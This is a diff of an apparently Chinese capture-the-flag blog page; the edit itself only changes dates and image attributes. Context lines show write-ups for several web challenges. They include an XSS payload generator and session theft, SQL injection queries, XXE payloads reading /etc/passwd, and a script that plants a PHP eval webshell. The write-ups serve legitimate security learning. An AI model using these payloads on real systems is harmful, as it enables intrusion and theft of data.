@@ -56,7 +56,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/07/02/taoisms/24.png">
 <meta property="og:image" content="http://yoursite.com/2020/07/02/taoisms/25.png">
 <meta property="article:published_time" content="2020-07-02T02:33:01.000Z">
-<meta property="article:modified_time" content="2020-07-04T02:24:44.246Z">
+<meta property="article:modified_time" content="2020-07-14T05:06:40.929Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="buu">
 <meta name="twitter:card" content="summary">
@@ -245,7 +245,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-07-04 10:24:44" itemprop="dateModified" datetime="2020-07-04T10:24:44+08:00">2020-07-04</time>
+                <time title="Modified: 2020-07-14 13:06:40" itemprop="dateModified" datetime="2020-07-14T13:06:40+08:00">2020-07-14</time>
               </span>
 
           
@@ -260,18 +260,18 @@
 
       
         <h3 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker<a id="more"></a></h3><p>开题，注册登录，跳转到个人主页</p>
-<img src="/2020/07/02/taoisms/1.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/1.png" class="">
 
 <p>所有的边边框框都点不了，除了更换头像这一块，文件上传没跑了</p>
 <p>先上传一个图片马，成功上传，在前端页面发现了上传路径，访问，只能出来图片，没有被解析，上传.htaccess，不被允许的类型，burp抓包改后缀试试</p>
 <p>抓包再把后缀改为php成功上传</p>
-<img src="/2020/07/02/taoisms/2.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/2.png" class="">
 
 <p>直接上蚁剑，根目录下找到flag，或者直接网页读取</p>
-<img src="/2020/07/02/taoisms/3.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/3.png" class="">
 
 <p>建议还是用蚁剑，不知道什么原因文件名的F无法显示</p>
-<img src="/2020/07/02/taoisms/4.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/4.png" class="">
 
 <h3 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h3><p>论坛发帖，发帖需要注册，看这个发帖的形式应该是xss类型的题</p>
 <p>注册登录，题目有提示去到buu提供的xss平台，这边平台上有提供默认模块的xss链子，但是好像还是不太能打的通，看了wp，直接借用赵总的xss代码</p>
@@ -281,19 +281,19 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">in_str = <span class="string">""</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> in_str:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line">print(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure>
 
 <p>转化结果：</p>
-<img src="/2020/07/02/taoisms/5.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/5.png" class="">
 
 <p>提交之后访问一下保存的页面，记下路径</p>
-<img src="/2020/07/02/taoisms/7.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/7.png" class="">
 
 <p>这里有一个MD5的碰撞，用碰撞脚本就能很快跑出来</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1=<span class="string">''</span></span><br><span class="line">ch = string.printable</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ch:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ch:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> ch:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> ch :</span><br><span class="line">                str1=str(i)+str(j)+str(k)+str(l)</span><br><span class="line">                a=hashlib.md5(str1.encode(encoding=<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> a[<span class="number">0</span>:<span class="number">6</span>]==<span class="string">"2f18b8"</span>:</span><br><span class="line">                    print(str1)</span><br></pre></td></tr></table></figure>
 
 <p>之后就去那个xss网站收一下接收到的管理员的SESSION</p>
-<img src="/2020/07/02/taoisms/8.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/8.png" class="">
 
 <p>用管理员的SESSION值进行替换，成功登录</p>
-<img src="/2020/07/02/taoisms/6.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/6.png" class="">
 
 <p>这里应该是一个sql注入，测试没有过滤任何东西，直接进行联合注入查询即可</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#    #查表 flag,users</span></span><br><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'flag'</span><span class="comment">#   #查字段 flagg</span></span><br><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(flagg) <span class="keyword">from</span> flag<span class="comment"># #查值，查到flag</span></span><br></pre></td></tr></table></figure>
@@ -304,7 +304,7 @@
 
 <p>登录之后是一个文件包含，源码给了提示flag在/flag下</p>
 <p>file伪协议进行读取，弹出NONONO，应该是有WAF，经过测试php，read,base都被过滤了，这里可以用大小写绕过，源码处拿到了base64加密的数据</p>
-<img src="/2020/07/02/taoisms/9.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/9.png" class="">
 
 <h3 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -312,7 +312,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP Version <span class="number">7.4</span><span class="number">.0</span>-dev</span><br><span class="line"></span><br><span class="line">open_basedir：/<span class="keyword">var</span>/www/html</span><br><span class="line">    </span><br><span class="line">opcache.preload：/<span class="keyword">var</span>/www/html/preload.php</span><br><span class="line"></span><br><span class="line">开启了FFI</span><br><span class="line"></span><br><span class="line">disable_functions:set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure>
 
 <p>可以看出基本上所有的命令执行函数都被ban了，那就没想象中那么简单了，看了一下var_dump和scandir还是能用的，那就先来读一下www目录下的文件</p>
-<img src="/2020/07/02/taoisms/10.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/10.png" class="">
 
 <p>有一个preload.php可以访问，用show_source或者file_get_contents读取一下    </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -326,7 +326,7 @@
 
 <p>buu内网开一台靶机监听端口就能反弹flag</p>
 <h3 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h3><p>扫描没有任何信息，抓包，json数据格式</p>
-<img src="/2020/07/02/taoisms/13.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/13.png" class="">
 
 <p>尝试注入，没有任何反馈，思路卡住，以为会是模板注入，然而也不是</p>
 <p>看了wp，原来是XXE，把数据改成XML的形式传过去，报错</p>
@@ -335,23 +335,23 @@
 <p>缺少dtd实体，那这题要用xxe的dtd实体注入没跑了，这里要注意对%进行编码转换</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamsa</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string"></span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">'</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2020/07/02/taoisms/11.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/11.png" class="">
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&#39;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/07/02/taoisms/12.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/12.png" class="">
 
 <p>flag到手</p>
-<h3 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h3><img src="/2020/07/02/taoisms/14.png" class="" title="examplename">
+<h3 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h3><img src="/2020/07/02/taoisms/14.png" class="">
 
 <p>有提示，随便给name和pass赋值，抓包</p>
-<img src="/2020/07/02/taoisms/15.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/15.png" class="">
 
 <p>这里好像暴露了pass，有一点小疑问，没有一开始就给了源码，在name和pass对了之后才能读取到源码</p>
-<img src="/2020/07/02/taoisms/16.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/16.png" class="">
 
 <p>访问flflflflag.php页面，发现会重定向跳转，用burp访问，读取index.php</p>
-<img src="/2020/07/02/taoisms/17.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/17.png" class="">
 
 <p>扫描目录有一个dir.php，访问，列出了tmp目录下的文件信息</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dir.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">'/tmp'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -363,11 +363,11 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url = <span class="string">"http://b432da54-714c-46a4-aa62-1b52953d99f1.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span><span class="params">(url, file_content)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span><span class="params">()</span>:</span></span><br><span class="line">    webshell_content = <span class="string">'&lt;?php eval($_REQUEST[c]);?&gt;'</span>.encode(</span><br><span class="line">        <span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip()</span><br><span class="line">    file_content = <span class="string">'&lt;?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s")))&#123;echo "flag";&#125;?&gt;'</span> % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">"%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd"</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] %d / %d"</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
 <p>跑完之后再去访问dir.php，查看文件名，在去访问tmp目录下对应的文件</p>
-<img src="/2020/07/02/taoisms/18.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/18.png" class="">
 
 <h3 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h3><p>开题有个点击链接，点击没什么反应，以为会是php，但是不是，伪协议读取失败</p>
 <p>尝试python，成了，是flask</p>
-<img src="/2020/07/02/taoisms/19.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/19.png" class="">
 
 <p>整理一下代码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib <span class="keyword">from</span> flask </span><br><span class="line"><span class="keyword">import</span> Flask, session, request a</span><br><span class="line">pp = Flask(__name__) </span><br><span class="line">random.seed(uuid.getnode()) //uuid.getnode()获取主机MAC地址  <span class="number">02</span>:<span class="number">42</span>:ae:<span class="number">02</span>:<span class="number">08</span>:c5</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">True</span> @app.route(<span class="string">'/'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello World! Read somethings'</span> </span><br><span class="line"><span class="meta">@app.route('/read') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: url = request.args.get(<span class="string">'url'</span>) </span><br><span class="line">    m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE) </span><br><span class="line">    n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE) </span><br><span class="line">    <span class="keyword">if</span> m <span class="keyword">or</span> n: <span class="keyword">return</span> <span class="string">'No Hack'</span> </span><br><span class="line">        res = urllib.urlopen(url) </span><br><span class="line">        <span class="keyword">return</span> res.read() </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">            <span class="keyword">print</span> str(ex) <span class="keyword">return</span> <span class="string">'no response'</span> @</span><br><span class="line">app.route(<span class="string">'/flag'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>: </span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>: app.run( debug=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span> )</span><br></pre></td></tr></table></figure>
@@ -377,33 +377,33 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ae0208c5</span>)</span><br><span class="line">print(str(random.random()*<span class="number">233</span>))</span><br><span class="line"><span class="comment">#180.33971984089902</span></span><br></pre></td></tr></table></figure>
 
 <p>查看一下cookie，用flask_session_manager解密一下，再改掉username的值，代码中/flag路由只要session[‘username’]==fuck就能拿到flag</p>
-<img src="/2020/07/02/taoisms/20.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/20.png" class="">
 
 <p>这里出点意外，访问/flag，改掉session还是被拒绝访问，磨了一个小时不知道啥原因，flag不要了，方法学到了，告辞</p>
 <h3 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h3><p>开题是一个文件上传，不了解SVG，去搜一下</p>
-<img src="/2020/07/02/taoisms/21.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/21.png" class="">
 
 <p>看到这里就明白了，要用xxe</p>
 <p>先大致学了一下svg文件的格式，然后就开始写一个scg文件吧，xxe读一下/etc/passwd</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;3000&quot; width&#x3D;&quot;20000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;0&quot; y&#x3D;&quot;15&quot; fill&#x3D;&quot;red&quot;&gt;test &amp;xxe; test&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>
 
 <p>成功回显</p>
-<img src="/2020/07/02/taoisms/22.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/22.png" class="">
 
 <p>不知道这个载荷要怎么改才能读到flag，而且flag文件名也没有得到</p>
 <p>其他师傅的wp显示，flag在flag.txt文件中，载荷：file:./flag.txt或者是file:///proc/self/cwd/flag.txt</p>
 <p>进程可以通过访问/proc/self/目录来获取自己的系统信息，通过cwd获取当前目录来进入flag.txt文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:.&#x2F;flag.txt&quot;&gt; ]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;3000&quot; width&#x3D;&quot;20000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;0&quot; y&#x3D;&quot;15&quot; fill&#x3D;&quot;red&quot;&gt;test &amp;xxe; test&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/07/02/taoisms/23.png" class="" title="examplename">
+<img src="/2020/07/02/taoisms/23.png" class="">
 
